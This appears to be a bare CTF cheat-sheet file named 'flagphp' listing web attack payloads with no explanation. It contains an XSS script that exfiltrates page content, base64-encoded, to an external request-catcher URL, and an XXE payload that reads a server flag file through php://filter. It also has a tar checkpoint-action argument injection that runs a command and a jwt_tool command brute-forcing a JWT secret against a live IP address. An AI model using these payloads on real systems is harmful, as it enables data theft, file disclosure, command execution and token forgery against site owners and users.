# flagphp

<script>
	var x = document.getElementById("page-top")
	location.href="https://enki758fik199.x.pipedream.net/asd"
</script>

<script>
	var x = document.getElementById("page-top").innerHTML;
	location.href="https://enki758fik199.x.pipedream.net/test" + btoa(x);
</script>

curl -X ‘GET’ –data-binary ‘<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag">
]>
<foo>
&xxe;
</foo>’

-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -lah"

python3 jwt_tool.py -t http://34.159.31.74:31800 /api/app/admin -rc "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImlhdCI6MTYzNTkzNjY4OCwiZ XhwIjoxNjM2MDIzMDg4fQ.tQ2KlBU8tI5V1Akiqhwy2LSEOF9oBTvnYFs_xgwro04" -C -d ~/rockyou.txt


